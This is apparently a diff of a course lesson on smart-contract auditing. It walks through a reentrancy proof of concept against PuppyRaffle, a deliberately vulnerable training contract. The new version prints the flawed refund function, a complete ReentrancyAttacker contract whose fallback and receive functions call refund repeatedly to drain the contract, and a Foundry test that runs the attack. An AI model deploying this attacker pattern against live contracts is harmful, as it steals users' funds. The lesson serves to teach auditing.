@@ -4,75 +4,211 @@ title: Reentrancy - PoC
 
 _Follow along with this video:_
 
-## 
-
 ---
 
-# Exploiting the Reentrancy Bug: An In-Depth Guide
+### Reentrancy in PuppyRaffle
 
-Uncovering vulnerabilities in smart contracts has emerged as a critical task, particularly with the rise of DeFi protocols. In this blog post, we will guide you through the process of exploiting one of these vulnerabilities known as the 'reentrancy bug.' For this, we'll use a fictional contract called 'Puppy Raffle' as our case study.
+Returning to PuppyRaffle, let's look at how all we've learnt affects this protocol.
 
-## What is Reentrancy Bug and Why is it Dangerous?
-
-![](https://cdn.videotap.com/nWd247DHc5JaG5n6O8uq-37.66.png)
-
-A _reentrancy bug_ occurs when an external contract gets called before updating the state in a given function. This flaw is potentially destructive as it leads to a condition where the same function can be recursively invoked before the first execution is complete. In essence, it makes it possible for an attacker to drain all funds from the affected contract.
-
-Now, let's get to the heart of the matter and dive into how this reentrancy bug could be exploited in our case study, Puppy Raffle.
-
-## Implementing a Proof-of-Code for Reentrancy Attack
-
-Initially, we have the Puppy Raffle Test - `PuppyRaffleTest.t.sol`. Here, we'll take advantage of the existing refund test to carry out our exploit. We'll begin by copying the `refund test` and then refactor it to serve our needs.
+A look again at this `refund` function and we see a classic case of reentrancy with an external call being made before updating state.
 
 ```js
-// Copy pasted refund test
-testReentrancyRefund() { ... }
+function refund(uint256 playerIndex) public {
+    address playerAddress = players[playerIndex];
+    require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
+    require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
+
+    // @Audit: Reentrancy
+    payable(msg.sender).sendValue(entranceFee);
+
+    players[playerIndex] = address(0);
+    emit RaffleRefunded(playerAddress);
+}
 ```
 
-We perceive a `playerEntered` modifier is already implemented. We could use this, but we'll opt to copy and paste it directly into our test function.
+### The PoC
+
+We can start by writing a new test in the protocol's `PuppyRaffle.t.sol` file. We'll have a bunch of players enter the raffle.
 
 ```js
-address[] memory players = new address[](1);
+function test_reentrancyRefund() public {
+    address[] memory players = new address[](4);
+    players[0] = playerOne;
+    players[1] = playerTwo;
+    players[2] = playerThree;
+    players[3] = playerFour;
+    puppyRaffle.enterRaffle{value: entranceFee * 4}(players);
+
+}
 ```
 
-Here, only one player is being instanced. However, we plan to test multiple entrants to the raffle. Therefore, we will change it to include more players - in this case, four.
+> **Note:** There _is_ a `playersEntered` modifier we could use, included in this test suite, but we'll choose to be explicit here.
+
+Next we'll create our `ReentrancyAttacker` Contract.
 
 ```js
-address[] memory players = new address[](4);
+contract ReentrancyAttacker {
+    PuppyRaffle puppyRaffle;
+    uint256 entranceFee;
+    uint256 attackerIndex;
+
+    constructor(PuppyRaffle _puppyRaffle) {
+        puppyRaffle = _puppyRaffle;
+        entranceFee = puppyRaffle.entranceFee();
+    }
+
+    function attack() public payable {
+        address[] memory players = new address[](1);
+        players[0] = address(this);
+        puppyRaffle.enterRaffle{value: entranceFee}(players);
+        attackerIndex = puppyRaffle.getActivePlayerIndex(address(this));
+        puppyRaffle.refund(attackerIndex);
+    }
+}
 ```
 
-![](https://cdn.videotap.com/EsowklYmOJTJLU3Cxgzb-225.95.png)
+Once deployed, this `attack` function is going to kick off the attack. In order, we're entering the raffle, acquiring our `playerIndex`, and then refunding our `entranceFee`.
 
-## Building our Attack Contract: ReentrancyAttacker.sol
-
-Having completed our set up, we can now proceed to build our attack contract.
-
-In our attack contract, we need to create a recipient or a `fallback` function that will re-enter into the affected contract.
+This is going to cause our entranceFee to be sent back to our contract ... what happens then?
 
 ```js
-function() external payable { ... }
+function _stealMoney() internal {
+    if (address(puppyRaffle).balance >= entranceFee) {
+        puppyRaffle.refund(attackerIndex);
+
+    }
+}
+
+fallback() external payable {
+    _stealMoney();
+}
+
+receive() external payable {
+    _stealMoney();
+}
 ```
 
-This `fallback` function will only be triggered when the balance of the 'Puppy Raffle' contract is more than the `entranceFee`.
+Adding these functions to our `ReentrancyAttacker` contract finishes the job. When funds are sent back to our contract, the `fallback` or `receive` functions are called which is going to trigger another `refund` call in our `_stealMoney` function, completing the loop until the `PuppyRaffle` contract is drained!
+
+<details>
+<summary> ReentrancyAttacker Contract </summary>
 
 ```js
-if (address(puppyRaffle).balance >= entranceFee) { ... }
+contract ReentrancyAttacker {
+    PuppyRaffle puppyRaffle;
+    uint256 entranceFee;
+    uint256 attackerIndex;
+
+    constructor(PuppyRaffle _puppyRaffle) {
+        puppyRaffle = _puppyRaffle;
+        entranceFee = puppyRaffle.entranceFee();
+    }
+
+    function attack() public payable {
+        address[] memory players = new address[](1);
+        players[0] = address(this);
+        puppyRaffle.enterRaffle{value: entranceFee}(players);
+        attackerIndex = puppyRaffle.getActivePlayerIndex(address(this));
+        puppyRaffle.refund(attackerIndex);
+    }
+
+    function _stealMoney() internal {
+        if (address(puppyRaffle).balance >= entranceFee) {
+            puppyRaffle.refund(attackerIndex);
+
+        }
+    }
+    fallback() external payable {
+        _stealMoney();
+    }
+    receive() external payable {
+        _stealMoney();
+    }
+}
 ```
 
-In line with this, our attack contract will keep calling the `refund` function recursively until it has drained all the funds from the 'Puppy Raffle' contract.
+</details>
+<br>
 
-Now the attack execution is ready. We can create our malicious 'ReentrancyAttacker' contract and an attacker user with a sufficient balance to join the raffle. We will establish a starting and ending balance for both the 'ReentrancyAttacker' contract and the 'Puppy Raffle' contract.
+Alright, let's add this logic to our test. First we'll create an instance of the attacker contract and an attacker address, funding it with 1 ether.
 
-If the attack is successful, the final balance of the 'Puppy Raffle' contract should read zero, and the 'ReentrancyAttacker' contract should have stolen all the funds.
+```js
+ReentrancyAttacker attackerContract = new ReentrancyAttacker(puppyRaffle);
+address attacker = makeAddr("attacker");
+vm.deal(attacker, 1 ether);
+```
 
-## Wrapping Up
+Next, we'll grab some balances so we're ablee to log our changes after the attack.
 
-From our proof-of-code run, the attack was indeed successful. This reentrancy issue in 'Puppy Raffle' contract is evidently a major vulnerability, and one must be appropriately addressed in our audit report.
+```js
+uint256 startingAttackContractBalance = address(attackerContract).balance;
+uint256 startingPuppyRaffleBalance = address(puppyRaffle).balance;
+```
 
-> "We have successfully written a Proof-of-Code (PoC) for reentrancy on this 'Puppy Raffle.' This is definitely going to be a high-risk vulnerability on our audit report."
+We finally call the attack, like so:
 
-By far, you've learned about the nature of a reentrancy bug and how to exploit it, making you a highly alert and more skilled blockchain developer.
+```js
+vm.prank(attacker);
+attackerContract.attack{value: entranceFee}();
+```
 
-So, take pride in yourself. This bug is a common and critical one; recognizing and fixing it takes your skills to another level.
+Then we'll console.log the impact:
 
-Now, let's head back to the 'Puppy Raffle' and carry on with our audit. So far, we have revealed a significant reentrancy issue. Keep your guard up; there's more to discover!
+```js
+console.log("attackerContract balance: ", startingAttackContractBalance);
+console.log("puppyRaffle balance: ", startingPuppyRaffleBalance);
+console.log(
+  "ending attackerContract balance: ",
+  address(attackerContract).balance
+);
+console.log("ending puppyRaffle balance: ", address(puppyRaffle).balance);
+```
+
+<details>
+<summary>test_reentrancyRefund</summary>
+
+```js
+function test_reentrancyRefund() public {
+    // users entering raffle
+    address[] memory players = new address[](4);
+    players[0] = playerOne;
+    players[1] = playerTwo;
+    players[2] = playerThree;
+    players[3] = playerFour;
+    puppyRaffle.enterRaffle{value: entranceFee * 4}(players);
+
+    // create attack contract and user
+    ReentrancyAttacker attackerContract = new ReentrancyAttacker(puppyRaffle);
+    address attacker = makeAddr("attacker");
+    vm.deal(attacker, 1 ether);
+
+    // noting starting balances
+    uint256 startingAttackContractBalance = address(attackerContract).balance;
+    uint256 startingPuppyRaffleBalance = address(puppyRaffle).balance;
+
+    // attack
+    vm.prank(attacker);
+    attackerContract.attack{value: entranceFee}();
+
+    // impact
+    console.log("attackerContract balance: ", startingAttackContractBalance);
+    console.log("puppyRaffle balance: ", startingPuppyRaffleBalance);
+    console.log("ending attackerContract balance: ", address(attackerContract).balance);
+    console.log("ending puppyRaffle balance: ", address(puppyRaffle).balance);
+}
+```
+
+</details>
+<br>
+
+All we need to do now is run this test with the command `forge test --mt test_reentrancyRefund -vvv` and we should receive...
+
+<img src="/security-section-4/23-reentrancy-poc/reentrancy-poc1.png" style="width: 75%; height: auto;">
+
+### Wrap Up
+
+We did it! We've proven the vulnerability through our application of our PoC and we'll absolutely be submitting this as a finding - likely a `High`.
+
+Be very proud of what you've learnt so far, you're now armed to safeguard De-Fi against some of the most prevalent vulnerabilities in Web3.
+
+Let's go back to the code back and continue our recon in the next lesson.
